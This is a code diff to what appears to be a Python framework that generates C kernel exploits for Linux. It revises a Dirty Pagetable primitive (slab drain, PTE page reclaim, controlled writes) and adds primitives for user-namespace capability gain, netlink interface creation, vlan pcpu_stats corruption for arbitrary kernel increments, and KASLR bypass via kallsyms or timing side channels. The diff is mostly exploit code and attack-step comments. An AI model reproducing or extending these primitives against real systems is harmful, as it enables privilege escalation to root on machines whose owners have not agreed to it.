@@ -363,84 +363,41 @@ static int trigger_modprobe(void) {
 
 
 class DirtyPagetable(ExploitPrimitive):
-    """Privilege escalation via page table entry manipulation.
+    """Page-level exploitation: drain slab to buddy, reclaim as PTE page.
 
-    Dirty Pagetable abuses a UAF or double-free in the slab allocator
-    to reallocate the freed object as a PTE page.  By writing controlled
-    data to the PTE entries, the attacker maps arbitrary physical pages
-    into their address space, enabling arbitrary physical memory access.
+    Primary bypass for CONFIG_RANDOM_KMALLOC_CACHES.  After freeing
+    all objects on the target slab page, the page returns to the
+    buddy allocator.  We spray mmap() to reclaim it as a PTE page,
+    then write controlled data through the PTE entry.
+
+    Used in exploit_real.c.jinja2 as the `dirty_pagetable` escalation.
     """
 
     name = "dirty_pagetable"
-    description = "PTE manipulation for arbitrary physical memory access"
+    description = "Slab page drain + PTE reclaim for randomized cache bypass"
 
     def generate_c(self) -> str:
         return '''\
-/* --- Escalation: Dirty Pagetable --- */
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <unistd.h>
+/* --- Dirty Pagetable: page-level exploitation --- */
+#include "dirty_pagetable.h"
 
 /*
- * Dirty Pagetable attack flow:
+ * Usage in exploit flow:
  *
- * 1. Trigger UAF/double-free on a slab object
- * 2. Free enough objects to return the slab page to the page allocator
- * 3. Spray mmap()/munmap() to get the page reallocated as a PTE page
- * 4. The dangling reference now points into a PTE page
- * 5. Write a crafted PTE entry that maps a physical page we want
- * 6. Access the mapped page to read/write arbitrary physical memory
- * 7. Use physical memory access to modify our process credentials
+ *   1. Trigger UAF (free target object)
+ *   2. Flood the same random cache via kvzalloc-triggering ops
+ *      (dummy interface create/destroy cycles) to free all siblings
+ *      on the same slab page.
+ *   3. The slab page returns to buddy allocator.
+ *   4. pte_spray_init() maps many PTE pages to reclaim the target.
+ *   5. Find the physical address via /proc/self/pagemap.
+ *   6. pte_overwrite(target_phys, data, len, offset) writes controlled
+ *      data into the freed slot's location.
+ *   7. Trigger UAF deref -- now uses our controlled data.
  *
- * The target physical pages for cred modification:
- * - Walk the init_task list to find our task_struct
- * - Locate the cred pointer
- * - Overwrite uid/gid/euid/egid to 0
+ * For slub merging detection and page-level drain strategies,
+ * see angband/recon/slab.py.
  */
-
-#define PTE_PRESENT  (1UL << 0)
-#define PTE_RW       (1UL << 1)
-#define PTE_USER     (1UL << 2)
-#define PTE_ACCESSED (1UL << 5)
-#define PTE_DIRTY    (1UL << 6)
-#define PTE_PSE      (1UL << 7)  /* Page Size Extension (for 2MB pages) */
-#define PTE_NX       (1UL << 63)
-
-/* Craft a PTE entry that maps a target physical address with RW access */
-static unsigned long craft_pte(unsigned long phys_addr) {
-    return (phys_addr & ~0xFFFUL) | PTE_PRESENT | PTE_RW | PTE_USER |
-           PTE_ACCESSED | PTE_DIRTY;
-}
-
-/* Number of mmap regions to spray for PTE page allocation */
-#define PTE_SPRAY_COUNT 512
-#define PTE_SPRAY_SIZE  (2 * 1024 * 1024)  /* 2MB each */
-
-static void *pte_spray_addrs[PTE_SPRAY_COUNT];
-
-static int pte_spray_setup(void) {
-    for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
-        pte_spray_addrs[i] = mmap(NULL, PTE_SPRAY_SIZE,
-                                   PROT_READ | PROT_WRITE,
-                                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-        if (pte_spray_addrs[i] == MAP_FAILED) {
-            perror("mmap pte spray");
-            return -1;
-        }
-        /* Touch the pages to force PTE allocation */
-        *(volatile char *)pte_spray_addrs[i] = 0;
-    }
-    printf("[escalate] PTE spray: %d regions mapped\\n", PTE_SPRAY_COUNT);
-    return 0;
-}
-
-static void pte_spray_cleanup(void) {
-    for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
-        if (pte_spray_addrs[i] && pte_spray_addrs[i] != MAP_FAILED)
-            munmap(pte_spray_addrs[i], PTE_SPRAY_SIZE);
-    }
-}
 /* --- end dirty_pagetable --- */
 '''
 
@@ -504,6 +461,161 @@ static void check_root(void) {
 '''
 
 
+class NetlinkSetup(ExploitPrimitive):
+    """Create network interfaces via Netlink RTM_NEWLINK.
+
+    Provides veth pair creation, macvlan creation, and link deletion.
+    Requires CAP_NET_ADMIN (available in user + network namespace).
+    """
+
+    name = "netlink_ops"
+    description = "Netlink RTM_NEWLINK for veth/macvlan interface creation"
+
+    def generate_c(self) -> str:
+        return '''\
+/* --- Netlink network interface operations --- */
+#include "netlink.h"
+
+static int nl_fd = -1;
+
+static int netlink_setup(void) {
+    nl_fd = nl_create_socket();
+    if (nl_fd < 0) {
+        fprintf(stderr, "[-] Failed to create netlink socket\\n");
+        return -1;
+    }
+    return 0;
+}
+
+static void netlink_cleanup(void) {
+    if (nl_fd >= 0) close(nl_fd);
+}
+/* --- end netlink_ops --- */
+'''
+
+
+class UserNamespaceSetup(ExploitPrimitive):
+    """Create child in new user + network namespace to gain CAP_NET_ADMIN.
+
+    Uses clone(CLONE_NEWUSER|CLONE_NEWNET) to get both namespaces at once,
+    which avoids the transitive capability check that blocks unshare(NEWNET)
+    from inside a user namespace.
+    """
+
+    name = "userns_setup"
+    description = "clone(NEWUSER|NEWNET) child for CAP_NET_ADMIN"
+
+    def generate_c(self) -> str:
+        return '''\
+/* --- clone-based user + network namespace setup --- */
+#include "userns.h"
+
+/*
+ * userns_clone_and_run(fn, arg) creates a child in new user+network
+ * namespaces. The child runs fn(arg) with uid=0 and all capabilities.
+ * Returns child's exit status or -1 on error.
+ *
+ * Usage: int main(void) { return userns_clone_and_run(exploit_child, NULL); }
+ */
+/* --- end userns_setup --- */
+'''
+
+
+class PcpuStatsCorrupt(ExploitPrimitive):
+    """Exploit via fake vlan_pcpu_stats to get controlled kernel writes.
+
+    When combined with a UAF that causes macvlan_count_rx() to use a
+    controlled vlan pointer, the pcpu_stats pointer can be hijacked.
+    Each call to u64_stats_inc/u64_stats_add writes to the address:
+      pcpu_stats + (this_cpu_ptr offset)
+
+    For single-CPU targets (pinned), this gives arbitrary increment/add.
+    """
+
+    name = "pcpu_stats"
+    description = "pcpu_stats corruption for controlled kernel increment/add"
+
+    def generate_c(self) -> str:
+        return '''\
+/* --- Escalation: pcpu_stats corruption --- */
+#include <string.h>
+#include <stdint.h>
+
+/*
+ * struct vlan_pcpu_stats layout (from include/linux/if_vlan.h):
+ *   offset 0:  u64_stats_sync syncp (8 bytes, sequence counter)
+ *   offset 8:  u64 rx_packets
+ *   offset 16: u64 rx_bytes
+ *   offset 24: u64 rx_multicast
+ *   offset 32: u64 tx_packets
+ *   offset 40: u64 tx_bytes
+ *   offset 48: u32 rx_errors
+ *   offset 52: u32 tx_dropped
+ *
+ * macvlan_count_rx() does:
+ *   get_cpu_ptr(vlan->pcpu_stats);
+ *   u64_stats_update_begin(&pcpu_stats->syncp);  // seqcount_t write
+ *   u64_stats_inc(&pcpu_stats->rx_packets);      // +1 to rx_packets
+ *   u64_stats_add(&pcpu_stats->rx_bytes, len);   // +len to rx_bytes
+ *   u64_stats_update_end(&pcpu_stats->syncp);
+ *
+ * By controlling vlan->pcpu_stats, we control where these writes land.
+ * get_cpu_ptr adds PER_CPU_OFFSET to the pointer.
+ */
+
+#define PCPU_SYNC_OFFSET    0
+#define PCPU_RX_PKTS_OFFSET 8
+#define PCPU_RX_BYTES_OFFSET 16
+
+/* On single-CPU: PER_CPU_OFFSET is 0, so pcpu_stats = raw pointer */
+static unsigned long fake_pcpu_stats_addr;
+
+static void pcpu_stats_set_target(unsigned long addr) {
+    /* Set where u64_stats_inc will write:
+     *   target_addr = addr - PER_CPU_OFFSET (0 on pinned CPU) - field_offset
+     * We want u64_stats_inc to increment at target:
+     *   fake_pcpu_stats = target - PCPU_RX_PKTS_OFFSET
+     */
+    fake_pcpu_stats_addr = addr - PCPU_RX_PKTS_OFFSET;
+    printf("[escalate] pcpu_stats target: 0x%lx (fake ptr: 0x%lx)\\n",
+           addr, fake_pcpu_stats_addr);
+}
+
+/* --- end pcpu_stats --- */
+'''
+
+
+class KallsymsLeak(ExploitPrimitive):
+    """KASLR bypass via /proc/kallsyms or side-channel timing.
+
+    Uses sudo kallsyms in parent namespace (most reliable),
+    with side-channel timing as fallback.
+    """
+
+    name = "kallsyms_leak"
+    description = "KASLR bypass via kallsyms (parent ns) or side-channel timing"
+
+    def generate_c(self) -> str:
+        return '''\
+/* --- KASLR bypass: kallsyms + side-channel fallback --- */
+#include "kaslr.h"
+
+/*
+ * kaslr_leak_kallsyms_parent(ctx):
+ *   Uses sudo to read /proc/kallsyms from the INIT namespace.
+ *   Call BEFORE entering any user namespace.
+ *
+ * kaslr_leak_sidechannel(ctx):
+ *   Purely userspace syscall entry timing leak.
+ *   Call AFTER pinning to a CPU core.
+ *
+ * kaslr_apply_offsets(ctx, ...):
+ *   Compute exact symbols from kernel_base + known offsets (from config).
+ */
+/* --- end kallsyms_leak --- */
+'''
+
+
 # ---------------------------------------------------------------------------
 # Registry
 # ---------------------------------------------------------------------------
@@ -516,6 +628,10 @@ PRIMITIVE_REGISTRY: dict[str, type[ExploitPrimitive]] = {
     "modprobe_path": ModprobePath,
     "dirty_pagetable": DirtyPagetable,
     "commit_creds": CommitCredsEscalation,
+    "netlink_ops": NetlinkSetup,
+    "userns_setup": UserNamespaceSetup,
+    "pcpu_stats": PcpuStatsCorrupt,
+    "kallsyms_leak": KallsymsLeak,
 }
 
 
